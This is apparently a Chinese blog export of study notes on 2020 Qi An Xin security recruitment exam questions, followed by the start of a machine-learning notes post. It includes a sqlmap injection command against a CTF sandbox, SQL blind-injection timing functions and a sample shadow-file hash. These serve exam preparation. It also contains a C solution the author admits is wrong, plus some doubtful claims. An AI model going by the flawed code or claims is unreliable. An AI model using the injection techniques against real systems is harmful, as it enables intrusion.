asset_img 1.11.1.png 控制寄存器 %}\n\n**CR0**\n是系统内的控制寄存器之一。控制寄存器是一些特殊的寄存器，它们可以控制CPU的一些重要特性。\n第0位是保护允许位PE(Protedted Enable)，用于启动保护模式，如果PE位置1，则保护模式启动，如果PE=0，则在实模式下运行。\n第1位是监控协处理位MP(Moniter coprocessor)，它与第3位一起决定：当TS=1时操作码WAIT是否产生一个“协处理器不能使用”的出错信号。第3位是任务转换位(Task Switch)，当一个任务转换完成之后，自动将它置1。随着TS=1，就不能使用协处理器。\n第2位是模拟协处理器位 EM (Emulate coprocessor)，如果EM=1，则不能使用协处理器，如果EM=0，则允许使用协处理器。\n第4位是微处理器的扩展类型位 ET(Processor Extension Type)，其内保存着处理器扩展类型的信息，如果ET=0，则标识系统使用的是287协处理器，如果 ET=1，则表示系统使用的是387浮点协处理器。\n第31位是分页允许位(Paging Enable)，它表示芯片上的分页部件是否允许工作。\n第16位是写保护未即WP位(486系列之后)，只要将这一位置0就可以禁用写保护，置1则可将其恢复。\n\n**CR1**\n是未定义的控制寄存器，供将来的处理器使用。\n\n**CR2**\n是页故障线性地址寄存器，保存最后一次出现页故障的全32位线性地址。\n\n**CR3**\n是页目录基址寄存器，保存页目录表的物理地址，页目录表总是放在以4K字节为单位的存储器边界上，因此，它的地址的低12位总为0，不起作用，即使写上内容，也不会被理会。\n\n**CR4**\n在Pentium系列（包括486的后期版本）处理器中才实现，它处理的事务包括诸如何时启用虚拟8086模式等。\n\n\n\n12.以下哪个选项用于解决缓解间接调用和调用不可靠目标的问题( D )\n\nA. ASLR；B. EDP；C. GS； D. CFG\n\n解析：CFG（Control Flow Guard）控制流防护，是微软在Windows8.0以及Windows10上推出的新的防护机制。防护点在于，防护间接调用，防止在程序间接调用函数的时候，使用恶意代码进行替换，导致执行恶意程序。CFG的实现机制在于每当存在间接调用的函数的时候，就会先去判断一下间接调用的地址处是不是一个有效的函数的起始地址。\n\n\n\n13.Windbg中通过哪条命令监控指定dll加载( A )\n\nA. sxe；B. lm；C. reload；D. pct\n\n解析：\n\nsxe：与dll加载有关\n\nlm：用来查看库的信息，比如库的路径、时间戳、库的加载地址等。一般使用模糊匹配的模式。\n\n.reload：删除指定模块的所有符号信息，并且按需要重新加载这些符号。\n\npct：执行程序，直到它到达调用指令或返回指令。\n\n\n\n14.WEB漏洞扫描工具通过网络爬虫测试web应用系统，检测常见的Web应用漏洞。常见的WEB漏洞扫描工具有：AppScan、Netsparker、Nikto、WebInspect。\n\n\n\n15.关于OWASP Top 10 2017 十项最严重的Web 应用程序安全风险，以下哪种漏洞类型不在范围内？( E )\n\nA. 不安全的反序列化；B. XML外部实体注入；C. 使用了已知漏洞的组件；D. 敏感数据泄露；E. SSTI\n\n具体看[OWASP Top 10 2017 10项最严重的 Web 应用程序安全风险](https://blog.csdn.net/lilongsy/article/details/79761362)\n\nSSTI是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。引发SSTI的真正原因是`render_template`渲染函数的问题，渲染函数在渲染的时候，往往对用户输入的变量不做渲染。\n\n\n\n16.对一个文件的访问，常由用户访问权限和文件属性共同限制。\n\n\n\n17.TCP是面向连接的，UDP是面向无连接的；TCP适用于可靠性较高的局域网，UDP适用于可靠性较差的广域网。\n\n\n\n18.面向对象的三大特性：封装、继承、多态。\n\n面向对象的七(或五大原则，前五项)大基本原则：单一职责原则（Single Function Principle, SFP） 、开放封闭原则（Open-Closed Principle, OCP）  、里氏替换原则（Liskov Substitution Principle, LSP）、  依赖倒置原则（Dependency Inversion Principle, DIP）、接口隔离原则（Inteface Segregation Principle, ISP）、迪米特法则（Law of Demeter, LoD）、组合/聚合复用原则（Composite/Aggregate Reuse Principle, CARP）。详细请看[面对对象七大原则](https://blog.csdn.net/qq_37234501/article/details/115273019)\n\n\n\n19.以下程序在little-endian架构处理器下的输出是：\n\n```c\nint i;\nchar *pc = &i;\npc[0] = 1;\nprintf(\"%d\\n\", i);\n/**\n1\n*/\n```\n\n\n\n20.volatile是一个特征修饰符（type specifier）。volatile的作用是作为指令关键字，确保本条指令不会因编译器的优化而省略，且要求每次直接读值。一个变量可以既是const又是volatile。一个指针可以是volatile。当gcc -O0时，volatile起不到作用，因为-O0表示不做任何优化，这是默认的编译选项。\n\n\n\n21.常见的 Web 攻击手段主要有 XSS 攻击、CSRF 攻击、SQL 注入攻击、DDos 攻击、文件漏洞攻击等。\n\n\n\n22.系统入侵攻击的方式有口令攻击、漏洞攻击、木马攻击、后门攻击。\n\n\n\n23.选用比较长和复杂的用户登录口令、使用防病毒软件、尽量避免开放过多的网络服务能减少用户计算机被攻击的可能性。\n\n\n\n24.监听0~1023端口都需要root权限。\n\n\n\n25.修改free hook 等插入的函数指针、非线性修改函数返回地址、使用函数指针进行覆写可能导致Windows 10 上控制流劫持。\n\n\n\n26.内存破坏类漏洞调试分析中的常见技巧有开启heap相关检测选项、内存访问断点、条件断点。\n\n\n\n27.哪些函数或语句是SQL延迟盲注利用中会用到？sleep、benchmark、DBMS_PIPE.RECEIVE_MESSAGE、WAITFOR DELAY。\n\n\n\n28.进出栈顺序，简单。\n\n\n\n29.各种排序算法**空间复杂度**：\n\n插入排序 = 冒泡排序 = 堆排序 = $O(1)$\n\n快速排序 = $O(\\log N)$\n\n\n\n30.接口是通用的，用来描述方法是干什么用的，方法的默认修饰符为public、abstract。不可以为final是因为方法要被重写。描述符如果为private或者protected，那么子类重写的方法的描述符也可以为private或者protected，这样就是有了访问限制，不符合接口所要达到的的任何人都可以使用的原则。\n\n\n\n31.老板一共需要给某个员工发奖金n元，可以选择一次发1元，也可以选择一次发2元，也可以选择一次发3元。请问老板给这位员工发放完n元奖金共有多少种不同的方法？数据范围：1 <= n <= 10\n\n分析：可以这样想，发5元怎么发？**不对，再说吧**\n1：先发1块的情况下，剩下4块是不是就和发4块的方法一样了？\n2：先发2块的情况下，剩下3块是不是就和发3块的方法一样了？\n3：先发3块的情况下，剩下2块是不是就和发2块的方法一样了？\n4：先发4块的情况下，剩下1块是不是就和发1块的方法一样了？\n5：5块一次性发完，唯一方法\n\n```c\n/**\n * \n * @param num_money int整型 奖金的总数,单位为元\n * @return int整型\n *\n * C语言声明定义全局变量请加上static，防止重复定义\n */\nint CalulateMethodCount(int num_money ) {\n    // write code here\n    static int count = 0;\n    if(num_money < 1 || num_money > 10){\n        printf(\"奖金的总数有误！\\n\");\n        exit(-1);\n    }\n    else{\n        //递归结束条件\n        if(num_money == 1)\n            return 1;\n        else{\n            //实现f(n)=f(n-1)+f(n-2)+...+f(1)+1\n            count = count + CalulateMethodCount(num_money-1);\n        }\n    }\n    return count + 1;\n}\n```\n\n\n\n32.撤销/恢复操作具有广泛的用途，比如word文档中输入一个单词，可以点撤销，然后可以再恢复。\n编程实现如下功能：  从标准输入读取到一个字符串，字符串可包含0个或多个单词，单词以空格或者tab分隔； 如果遇到 \"undo\" 字符串，表示\"撤销\"操作，前一个字符串被撤销掉； 如果遇到\"redo\"字符串，表示恢复刚才撤销掉的字符串。\n例如：输入字符串 \"hello undo redo world.\"，  对字符串中的 undo 和 redo 处理后， 最终输出的结果为 \"hello world.\"\n\n分析：先初始化两个栈stack和redo，然后利用双栈求解。遍历词表：\n\n1. 遇到普通词就压入stack，并清空redo栈，因为此时写入了一个新词，再往前的词已经找不回来了；\n2. 遇到undo就从stack中弹栈至redo；\n3. 遇到redo就从redo中弹栈至stack。\n\n最终stack中的词就是最后保留下来的词。\n\n```python\n#空格作为分隔字符串的标志\ncommands = input().strip().split(\" \")\nstack, redo = [], []\nfor cmd in commands:\n    if cmd == \"undo\":\n        #如果stack不为空\n        if stack:\n            redo.append(stack.pop())\n    elif cmd == \"redo\":\n        if redo:\n            stack.append(redo.pop())\n    else:\n        redo.clear()\n        stack.append(cmd)\n#用空格连接stack中的字符串\nprint(\" \".join(stack))\n```\n\n\n\n# 【2020】奇安信秋招安全方向试卷2 \n\n1.其中不是密码破解的方式为？( B )\n\nA. 密码学分析；B. 撞库；C. 暴力破解；D.字典破解\n\n解析：\n\n- 密码分析学的主要目的是研究加密消息的破译和消息的伪造。通过分析密文来推断该密文对应的明文或者所用密码的密钥的过程也称作密码攻击。密码学分析可分为四类：唯密文攻击、已知明文攻击、选择明文攻击、选择密文攻击。\n- 撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登录其他网站后，得到一系列可以登录的用户。撞库不属于密码破解。\n- 暴力破解一般指枚举法。暴力破解就是利用所有可能的字符组密码，去尝试破解。这是最原始、粗暴的破解方法，根据运算能力，如果能够承受得起时间成本的话，最终一定会爆破出密码。\n- 字典破解就是通过比较合理的条件，筛选或者过滤掉一些全字符组合的内容，大幅降低爆破的成本。我们把筛选出的密码组合成特定的字典。现在用字典爆破密码也是可以的，但是这样做有可能会漏掉真正的密码。\n\n\n\n2.缓冲区溢出漏洞是指当计算机向缓冲区内填充数据位数时，超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。\n\n\n\n3.网络信息系统安全的第一道防线：系统自身没有漏洞；第二道防线：防病毒和Web应用防护系统(Web Application Firewall, WAF)，入侵防御系统(Intrusion Prevention System, IPS)，入侵检测系统(Intrusion Detection System, IDS)；第三道：数据库备份。\n\n\n\n4.在/etc/passwd文件中有一行为：test:x:0:1000::/home/test:/bin/sh，这代表test用户为特权用户。\n\n解析：/etc/passwd文件中记录了每个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。\n\n/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：\n\n```\n用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell\n```\n\n- 用户名：代表用户账号的字符串。通常长度不超过8个字符，并且由大小写字母和/或数字组成。登录名中不能有冒号(:)，因为冒号在这里是分隔符。为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)开头。\n- 口令：一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。\n- 用户标识号：是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把他们视为同一个用户，但是他们可以有不同的口令、不同的主目录以及不同的登录Shell等。通常用户标识号的取值范围是0～65535。0是超级用户root的标识号，1～99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个上限是500。\n- 组标识号：字段记录的是用户所属的用户组。它对应着/etc/group文件中的一条记录。\n- 注释性描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用作finger命令的输出。\n- 主目录：也就是用户的起始工作目录，它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。\n- 登录Shell：用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。用户的登录Shell也可以指定为某个特定的程序（此程序不是一个命令解释器）。利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。有些Linux系统要求只有那些在系统中登记了的程序才能出现在这个字段中。系统中有一类用户称为伪用户（psuedousers），这些用户在Linux /etc/passwd文件中也占有一条记录，但是不能登录，因为它们的登录Shell为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。\n\n\n\n5.对于Windows系统，提权就是从User用户提升到system用户。\n\n\n\n6.使用静态的ARP缓存可以有效地对抗ARP欺骗。\n\n\n\n7.日常所见的校园饭卡是利用的身份认证的单因素法。[身份认证的方法](http://blog.chinaunix.net/uid-20509115-id-1660146.html)\n\n\n\n8.如果在/etc/shadow文件中存在一行为：\ntest:!!\\$6​\\$tGvVUhEY\\$PIkpI43HPaEoRrNJSRpM3H0YWOsqTqXCxtER6rak5PMaAoyQohrXNB0YoFCmAuh406n8XOvBBldvMy9trmIV00:18047:7:90:7:::\n这代表test用户账号不可以正常使用。\n\n解析：/etc/shadow 文件，用于存储 Linux 系统中用户的密码信息，又称为“影子文件”。/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。\n\n同 /etc/passwd 文件一样，文件中每行代表一个用户，同样使用 \":\" 作为分隔符，不同之处在于，每行用户信息被划分为 9 个字段。每个字段的含义如下：\n\n```\n用户名:加密密码:最后一次修改时间:最小修改时间间隔:密码有效期:密码需要变更前的警告天数:密码过期后的宽限时间:账号失效时间:保留字段\n```\n\n- 用户名：同 /etc/passwd 文件的用户名有相同的含义。\n\n- 加密密码：这里保存的是真正加密的密码。目前 Linux 的密码采用的是 SHA512 散列加密算法。注意，这串密码产生的乱码不能手工修改，如果手工修改，系统将无法识别密码，导致密码失效。很多软件通过这个功能，在密码串前加上 \"!\"、\"\\*\" 或 \"x\" 使密码暂时失效。所有伪用户的密码都是 \"!!\" 或 \"\\*\"，代表没有密码是不能登录的。当然，新创建的用户如果不设定密码，那么它的密码项也是 \"!!\"，代表这个用户没有密码，不能登录。\n\n- 最后一次修改时间：此 root 账号在 1970 年 1 月 1 日之后的第 18047 天修改的 root 用户密码。那么，到底 18047 代表的是哪一天呢？可以使用如下命令进行换算：\n\n  ```\n  ┌──(v5le0n9㉿kali)-[~]\n  └─$ date -d \"1970-01-01 18047 days\"\n  2019年 05月 31日 星期五 00:00:00 CST\n  ```\n\n- 最小修改时间间隔：最小修改间隔时间，也就是说，该字段规定了从第 3 字段（最后一次修改密码的日期）起，多长时间之内不能修改密码。如果是 0，则密码可以随时修改；如果是 10，则代表密码修改后 10 天之内不能再次修改密码。此字段是为了针对某些人频繁更改账户密码而设计的。\n\n- 密码有效期：经常变更密码是个好习惯，为了强制要求用户变更密码，这个字段可以指定距离第 3 字段（最后一次更改密码）多长时间内需要再次变更密码，否则该账户密码进行过期阶段。该字段的默认值为 99999，也就是 273 年，可认为是永久生效。如果改为 90，则表示密码被修改 90 天之后必须再次修改，否则该用户即将过期。管理服务器时，通过这个字段强制用户定期修改密码。\n\n- 密码需要变更前的警告天数：与第 5 字段相比较，当账户密码有效期快到时，系统会发出警告信息给此账户，提醒用户 \"再过 n 天你的密码就要过期了，请尽快重新设置你的密码！\"。该字段的默认值是 7，也就是说，距离密码有效期的第 7 天开始，每次登录系统都会向该账户发出 \"修改密码\" 的警告信息。\n\n- 密码过期后的宽限时间：也称为“口令失效日”，简单理解就是，在密码过期后，用户如果还是没有修改密码，则在此字段规定的宽限天数内，用户还是可以登录系统的；如果过了宽限天数，系统将不再让此账户登录，也不会提示账户过期，是完全禁用。比如说，此字段规定的宽限天数是 10，则代表密码过期 10 天后失效；如果是 0，则代表密码过期后立即失效；如果是 -1，则代表密码永远不会失效。\n\n- 账号失效时间：同第 3 个字段一样，使用自  1970 年 1 月 1 日以来的总天数作为账户的失效时间。该字段表示，账号在此字段规定的时间之外，不论你的密码是否过期，都将无法使用！该字段通常被使用在具有收费服务的系统中。\n\n- 保留字段：这个字段目前没有使用，等待新功能的加入。\n\n\n\n9.如果sa是空口令，那就意味着攻击者可能侵入系统执行任意操作，威胁系统安全。\n\n解析：MSSQL SERVER 的默认管理员帐号是 SA，所以一般把 MSSQL SERVER 的空密码叫作SA空口令。\n\n\n\n10.`set charcter_set_client='gbk'`可能造成宽字符注入。\n\n\n\n11.安全审计是系统活动和记录的独立检查和验证，其功能有：①辅助辨识和分析未经授权的活动或攻击；②对与已建立的安全策略的一致性进行核查；③帮助发现需要改进的安全控制措施。\n\n\n\n12.非军事化区DMZ是为了解决安全防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。\n\n解析：DMZ（Demilitarized Zone）即俗称的隔离区或非军事区，与军事区和信任区相对应，作用是把WEB，e-mail等允许外部访问的服务器单独接在该区端口，使整个需要保护的内部网络接在信任区端口后，不允许任何访问，实现内外网分离，达到用户需求。DMZ可以理解为一个不同于外网或内网的特殊网络区域，DMZ内通常放置一些不含机密信息的公用服务器，比如Web、Mail、FTP等。这样来自外网的访问者可以访问DMZ中的服务，但不可能接触到存放在内网中的公司机密或私人信息等，即使DMZ中服务器受到破坏，也不会对内网中的机密信息造成影响。\n\n\n\n13.PostgreSQL的默认端口为5432。\n\n\n\n14.Windows系统漏洞微软的漏洞编号命名格式为：MS08067\nMS Micosoft的缩写，固定格式；\n08 表示年份，即2008年发布的漏洞；\n067 表示顺序，即当年度发布的第67个漏洞。\n\n\n\n15.RSA可用于加密，数字签名和密钥交换体制。\n\n\n\n16.DNS欺骗是发生在TCP/IP协议中应用层的问题。\n\n\n\n17.NTP服务一般开启的端口是UDP123。\n\n解析：NTP(Network Time Protocol)是用来使计算机时间同步化的一种协议，它可以使计算机对其服务器或时钟源(如石英钟，GPS等等)做同步化，它可以提供高精准度的时间校正(LAN上与标准间差小于1毫秒，WAN上几十毫秒)，且可介由加密确认的方式来防止恶毒的协议攻击。\n\n\n\n18.SSRF（Server-Side Request Forgery）服务端请求伪造，SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。\n\n\n\n19.启动数据库的账号一般是高权限账号，使用数据库执行系统命令即相当于使用高权限账号执行系统命令，因此数据库提权也属于权限继承类提权。\n\n\n\n20.蠕虫病毒是一种常见的计算机病毒，是无须计算机使用者干预即可运行的独立程序，它通过不停的获得网络中存在漏洞的计算机上的部分或全部控制权来进行传播。计算机病毒是指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据和恶意篡改系统，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码。\n\n蠕虫是一种可以自我复制的代码，并且通过网络传播，通常无需人为干预就能传播。蠕虫病毒入侵并完全控制一台计算机之后，就会把这台机器作为宿主，进而扫描并感染其他计算机。当这些新的、被蠕虫入侵的计算机被控制之后，蠕虫会以这些计算机为宿主继续扫描并感染其他计算机，这种行为会一直延续下去。蠕虫使用这种递归的方法进行传播，按照指数增长的规律分布自己，进而及时控制越来越多的计算机。\n\n\n\n21.安全套接字协议(Secure Sockets Layer，SSL)，及其继任者传输层安全(Transport Layer Security，TLS)是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层与应用层之间对网络连接进行加密。\n\n\n\n22.`PermitRootLogin no`意思是不允许root账号直接登录系统。\n\n\n\n23.linux中tail -f 可以读取正在发生改变的日志文件。\n\n解析：tail用于查看文件尾部的内容，与head相对应。常用来查看日志文件，通过-f实时查看文件最新内容。尤其是对于日志文件较大的时候，通过tail指定输出的行数来查看日志。\n\n\n\n24.sqlmap中-u可以进行POST型注入的检测。\n\n解析：-u可以进行POST型注入，但不是用-u检测，而是用--data检测。-u后接URL。比如：\n\n```\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800 --batch --data=\"id=1&pwd=333\"\n```\n\n\n\n25.Cobalt Strike的默认端口号是50050。\n\n解析：Cobalt Strike简称CS，是一款GUI框架式的渗透测试工具，集成了很多功能。最大的特点是可以团战，有一个服务器多个客户端，每个客户端就是一个攻击者，攻击者通过连接到服务端来共享攻击资源和目标信息甚至session，服务器必须是Linux系统的。\n\n\n\n26.路由权值的计算可能基于路径某单一特性计算，也可能基于路径多种属性。动态路由协议是按照路由的路由权值来判断路由的好坏，并且每一种路由协议的判断方法都是不一样的。\n\n\n\n27.IGP（内部网关协议）是在一个自治网络内网关（主机和路由器）间交换路由信息的协议。路由信息能用于网间协议（IP）或者其它网络协议来说明路由传送是如何进行的。IGP协议包括路由信息协议(RIP，Routing Information Protocol)、开放最短路径优先(Open Shortest Path First，OSPF)、中间系统到中间系统(Intermediate System-to-Intermediate System，IS-IS)、内部网关路由协议(Interior Gateway Routing Protocol，IGRP)、增强内部网关路由协议(Enhanced Interior Gateway Routing Protocol，EIGRP)。\n\n\n\n28.路由环问题会引起慢收敛、广播风暴、路由不一致的问题。\n\n\n\n29.点对点协议（Point to Point Protocol，PPP）为在点对点连接上传输多协议数据包提供了一个标准方法。PPP 最初设计是为两个对等节点之间的 IP 流量传输提供一种封装协议。在 TCP-IP 协议集中它是一种用来同步调制连接的数据链路层协议。\n\n\n\n30.网络防火墙的作用有：①防止内部信息外泄；②防止黑客访问；③建立内部信息和功能与外部信息和功能之间的屏障。\n\n\n\n31.Xposed框架的原理及常用的函数。\n\n答：原理： 替换system/bin/app_process文件，app_process就是zygote进程文件，所以Xposed通过替换zygote进程实现了控制手机上所有app进程。\n\n常用函数：\n\n (1)findAndHookMethod 参数：实现该方法的类的名称，用于解析目标和参数类的类加载器，目标方法名称，目标方法的参数以及回调；\n\n (2)findAndHookConstructor hook构造函数 参数：实现该方法的类的名称，用于解析目标和参数类的类加载器，目标方法的参数以及回调；\n\n(3)findClass：使用指定的类加载器查找类 类名的语法 java.lang.String java.lang.String[] android.app.ActivityThread.ResourcesKey android.app.ActivityThread$ResourcesKey 参数：上面格式的类名，类加载器 \n\n(4)findField：在类中查找自动并将其设置为可访问 参数：变量所在的class，变量名String \n\n(5)CallMethod 调用给定对象的实例或静态方法 参数：对象实例，方法名称，方法调用的参数 \n\n(6)newInstance 创建给定类的新实例 参数：类引用，构造函数调用的参数\n\n\n\n32.简述Hook技术。\n\n答：Hook 技术又叫做钩子函数，在系统没有调用该函数之前，钩子程序就先捕获该消息，钩子函数先得到控制权，这时钩子函数既可以加工处理(改变)该函数的执行行为，还可以强制结束消息的传递。简单来说，就是把系统的程序拉出来变成我们自己执行代码片段。   \n\n要实现钩子函数，有两个步骤：   \n\n1. 利用系统内部提供的接口，通过实现该接口，然后注入进系统（特定场景下使用）   \n2. 动态代理（使用所有场景）\n\n\n\n# 【2020】奇安信秋招安全方向试卷3\n\n1.下列类型中，不是java语言基本数据类型的是( C )\n\nA. long；B. double；C. String；D. float\n\n解析：String不是Java语言基本数据类型，它是引用类型。\n\n\n\n2.CPU的调度分为高级，中级和低级三种，其中高级调度是作业调度；中级调度是交换调度；低级调度是进程调度。\n\n\n\n3.uaf漏洞分析中需要开启的选项为？","categories":["往社畜方向前进"]},{"title":"机器学习","url":"/posts/498ab7d9.html","content":"\n做机器学习的实验做得我生无可恋，还是先补一下机器学习的几个算法的基本原理再说吧。\n\n<!--more-->\n\n# 1. 统计学习概述\n\n## 1.1. 统计学习三要素\n\n- 模型：确定学习模型的集合。模型在未进行训练前，其可能的参数是多个甚至无穷的，故可能的模型也是多个甚至无穷的，这些模型构成的集合就是假设空间。\n\n  {% asset_img 1.1.1.png 假设空间 %}\n\n  {% asset_img 1.1.2.png 假设空间 %}\n\n- 策略：确定模型选择的准则。即从假设空间中挑选出参数最优的模型的准则。模型的分类或预测结果与实际情况的误差（损失函数）越小，模型就越好。那么策略就是误差最小。\n\n  {% asset_img 1.1.3.png 策略 %}\n\n  {% asset_img 1.1.4.png 损失函数 %}\n\n  {% asset_img 1.1.5.png 策略 %}\n\n- 算法：实现求解最优模型的算法。即从假设空间中挑选模型的方法（等同于求解最佳的模型参数）。机器学习的参数求解通常都会转化为最优化问题，故学习算法通常是最优化算法，例如最速梯度下降法、牛顿法以及拟牛顿法等。\n\n以上是针对监督学习的三要素，下面是针对无监督学习的三要素：\n\n{% asset_img 1.1.6.png 无监督学习的三要素 %}\n\n## 1.2. 监督学习\n\n监督学习：从标注数据中学习预测模型的机器学习问题，其本质是学习输入到输出的映射的统计规律。\n\n输入空间：输入的所有可能取值的集合。\n\n实例：每一个具体的输入，通常由特征向量表示。\n\n特征空间：所有特征向量存在的空间。\n\n输出空间：输出的所有可能取值的集合。\n\n根据变量类型的不同，可分为回归问题、分类问题和标注问题。\n\n回归问题：输入变量与输出变量均为连续变量的预测问题。\n\n分类问题：输出变量为有限个离散变量的预测问题。\n\n标注问题：输入变量与输出变量均为变量序列的预测问题。\n\n{% asset_img 1.3.1.png 监督学习中的符号表示 %}\n\n{% asset_img 1.3.2.png 监督学习中的符号表示 %}\n\n## 1.3. 无监督学习\n\n无监督学习：从无标注数据中学习预测模型的机器学习问题，其本质是学习数据中的统计规律或潜在结构。\n\n{% asset_img 1.4.1.png 无监督学习中的符号表示 %}\n\n## 1.4 模型评估与选择\n\n训练误差：\n\n{% asset_img 1.5.1.png 训练误差 %}\n\n测试误差：\n\n{% asset_img 1.5.2.png 测试误差 %}\n\n误差率与准确率：\n\n{% asset_img 1.5.3.png 误差率与准确率 %}\n\n多项式拟合案例：\n\n{% asset_img 1.5.4.png 案例 %}\n\n{% asset_img 1.5.5.png 案例 %}\n\n{% asset_img 1.5.6.png 案例 %}\n\n过拟合：学习时选择的模型所包含的参数过多，以至于出现这一模型对已知数据预测得很好，但对未知数据预测得很差的现象。\n\n{% asset_img 1.5.7.png 训练误差与测试误差 %}\n\n{% asset_img 1.5.8.png 训练误差与测试误差 %}\n\n欠拟合：模型拟合程度不高，数据距离拟合曲线较远，或指模型没有很好地捕捉到数据特征，不能够很好地拟合数据。\n\n为了避免过拟合的问题出现，需要选择合适的模型。常用的模型选择方法：正则化和交叉验证。\n\n## 1.5 正则化和交叉验证\n\n### 1.5.1 正则化\n\n正则化：实现结构风险最小化策略。\n\n{% asset_img 1.5.9.png 正则化 %}\n\n{% asset_img 1.5.10.png 正则化项 %}\n\n奥卡姆剃刀原理：在模型选择时，选择所有可能模型中，能很好解释已知数据并且十分简单的模型。\n\n### 1.5.2 交叉验证\n\n{% asset_img 1.5.11.png 数据充足的情况下 %}\n\n在数据不足的情况下：\n\n- 简单交叉验证：随即将数据分为两部分，即训练集和测试集。\n- S折交叉认证：随机将数据分为S个互不相交、大小相同的子集，其中以S-1个子集作为训练集，余下的子集作为测试集。\n- 留一交叉验证：S折交叉验证的特殊情形，S=N，N为数据集的样本容量。(在数据极少的情况下使用)\n\n## 1.6 泛化能力\n\n{% asset_img 1.6.1.png 泛化误差 %}\n\n{% asset_img 1.6.2.png 泛化误差上界 %}\n\n{% asset_img 1.6.3.png 泛化误差上界 %}\n\n## 1.7 生成模型与判别模型\n\n### 1.7.1 生成模型\n\n{% asset_img 1.7.1.png 生成模型 %}\n\n### 1.7.2 判别模型\n\n{% asset_img 1.7.2.png 判别模型 %}\n\n### 1.7.3 两者区别\n\n{% asset_img 1.7.3.png 生成模型VS判别模型 %}\n\n## 1.8 监督学习应用\n\n### 1.8.1 分类问题\n\n{% asset_img 1.8.1.png 二分类问题 %}\n\n{% asset_img 1.8.2.png 二分类问题 %}\n\n方法：感知机、K近邻法、朴素贝叶斯、决策树、Logistic回归。\n\n应用：银行业务、网络安全、图像处理、手写识别、互联网搜索。\n\n### 1.8.2 标注问题\n\n{% asset_img 1.8.3.png 标注问题 %}\n\n方法：隐马尔可夫模型、条件随机场。\n\n应用：信息抽取、自然语言处理。\n\n### 1.8.3 回归问题\n\n类型：\n\n- 按输入变量个数：一元回归、多元回归\n- 按输入和输出变量之间的关系：线性回归、非线性回归\n\n损失函数：平方损失\n\n应用：商务领域\n\n# 2. 感知机\n\n## 2.1 感知机模型\n\n{% asset_img 2.1.1.png 模型介绍 %}\n\n{% asset_img 2.1.2.png 模型介绍 %}\n\n在几何中，如果特征空间是n维的，则超平面是n-1维的子空间。比如特征空间是2维的，那么超平面就是一条直线，超平面用来分隔正类和负类。\n\n{% asset_img 2.1.3.png 感知机模型的条件 %}\n\n{% asset_img 2.1.4.png 感知机学习策略 %}\n\n{% asset_img 2.1.5.png 感知机学习策略 %}\n\n## 2.2 梯度下降法\n\n{% asset_img 2.2.1.png 梯度的概念 %}\n\n{% asset_img 2.2.2.png 梯度下降法的算法 %}\n\n例子：\n\n{% asset_img 2.2.3.png 梯度下降法的例子 %}\n\n{% asset_img 2.2.4.png 梯度下降法的例子 %}\n\n梯度下降法的原理：\n\n{% asset_img 2.2.5.png 梯度下降法的原理 %}\n\n{% asset_img 2.2.6.png 梯度下降法的原理 %}\n\n{% asset_img 2.2.7.png 梯度下降法的原理 %}\n\n## 2.3 感知机的原始形式\n\n感知机采用监督学习中的二分类问题。原始形式用随机梯度下降法来更新w和b。\n\n{% asset_img 2.3.1.png 感知机学习问题 %}\n\n{% asset_img 2.3.2.png 随机梯度下降法 %}\n\n原始形式的算法：\n\n{% asset_img 2.3.3.png 原始形式的算法 %}\n\n例题分析：\n\n{% asset_img 2.3.4.png 例题分析 %}\n\n{% asset_img 2.3.5.png 例题分析 %}\n\n{% asset_img 2.3.6.png 例题分析 %}\n\n{% asset_img 2.3.7.png 例题分析 %}\n\n{% asset_img 2.3.8.png 例题分析 %}\n\n{% asset_img 2.3.9.png 例题分析 %}\n\n## 2.4 感知机的对偶形式\n\n{% asset_img 2.4.1.png 原始形式 %}\n\n{% asset_img 2.4.2.png 原始形式 %}\n\n对偶形式的算法：\n\n{% asset_img 2.4.3.png 对偶形式的算法 %}\n\n{% asset_img 2.4.4.png 对偶形式的算法 %}\n\n例题分析：\n\n{% asset_img 2.4.5.png 例题分析 %}\n\n{% asset_img 2.4.6.png 例题分析 %}\n\n{% asset_img 2.4.7.png 例题分析 %}\n\n{% 